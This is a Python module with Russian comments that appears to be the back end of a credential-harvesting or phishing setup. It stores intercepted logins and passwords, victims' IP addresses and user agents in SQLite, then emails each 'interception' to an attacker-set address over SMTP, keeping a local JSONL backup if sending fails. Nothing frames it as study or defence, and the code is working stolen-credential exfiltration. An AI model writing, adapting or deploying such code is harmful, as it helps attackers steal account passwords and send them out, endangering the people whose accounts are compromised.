#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional

from dotenv import load_dotenv
load_dotenv()

# Импортируем SQLite-функции
from db_capture import save_capture, init_db

SMTP_HOST = os.getenv('SMTP_HOST', 'smtp.yandex.ru')
SMTP_PORT = int(os.getenv('SMTP_PORT', 587))
SMTP_USER = os.getenv('SMTP_USER')
SMTP_PASSWORD = os.getenv('SMTP_PASSWORD')
TARGET_EMAIL = os.getenv('TARGET_EMAIL')

BACKUP_FILE = Path(__file__).parent / "captured_email_backup.jsonl"

# Инициализация БД при первом импорте
init_db()

def send_capture_email(data: Dict[str, Any]) -> bool:
    """
    Отправляет на почту И сохраняет в SQLite.
    """
    # === СОХРАНЯЕМ В SQLite ===
    save_capture(data)
    
    # === ОТПРАВЛЯЕМ НА ПОЧТУ ===
    if not all([SMTP_USER, SMTP_PASSWORD, TARGET_EMAIL]):
        print("[EmailCapture] Почта не настроена, но данные сохранены в SQLite")
        return True  # Всё равно успешно, т.к. сохранено в БД

    try:
        msg = MIMEMultipart()
        msg['From'] = SMTP_USER
        msg['To'] = TARGET_EMAIL
        msg['Subject'] = f"🔐 Перехват: {data.get('email', 'unknown')} | {datetime.now().strftime('%Y-%m-%d %H:%M')}"

        body = _format_email_body(data)
        msg.attach(MIMEText(body, 'plain', 'utf-8'))

        context = ssl.create_default_context()
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
            server.starttls(context=context)
            server.login(SMTP_USER, SMTP_PASSWORD)
            server.send_message(msg)

        print(f"[EmailCapture] ✅ Отправлено на почту: {data.get('email', 'unknown')}")
        return True

    except smtplib.SMTPAuthenticationError as e:
        print(f"[EmailCapture] ❌ Ошибка авторизации: {e}")
        _save_backup(data, f"auth_error: {str(e)}")
        return True  # Данные уже в БД
    except Exception as e:
        print(f"[EmailCapture] ❌ Ошибка отправки почты: {e}")
        _save_backup(data, f"error: {str(e)}")
        return True  # Данные уже в БД

def _format_email_body(data: Dict[str, Any]) -> str:
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    email = data.get('email') or data.get('username') or data.get('login') or 'не указан'
    password = data.get('password') or data.get('passwd') or data.get('pwd') or 'не указан'
    ip = data.get('ip', 'unknown')
    path = data.get('path', 'unknown')
    user_agent = data.get('user_agent', 'unknown')

    return f"""
╔══════════════════════════════════════════════════════════════
║ 🔐 НОВЫЙ ПЕРЕХВАТ
║ Время: {timestamp}
╠══════════════════════════════════════════════════════════════
║
║ 📧 Почта/Логин: {email}
║ 🔑 Пароль:       {password}
║
║ 🌐 IP:           {ip}
║ 📂 Эндпоинт:     {path}
║ 📱 User-Agent:   {user_agent[:100]}
╚══════════════════════════════════════════════════════════════

Полные данные:
{json.dumps(data, ensure_ascii=False, indent=2)}
"""

def _save_backup(data: Dict[str, Any], error: Optional[str] = None) -> None:
    entry = data.copy()
    entry['_backup_time'] = datetime.now().isoformat()
    entry['_error'] = error
    with open(BACKUP_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(entry, ensure_ascii=False) + '\n')

def retry_backup_sends() -> None:
    """Повторная отправка бэкапа (опционально)."""
    pass  # Данные уже в БД, можно игнорировать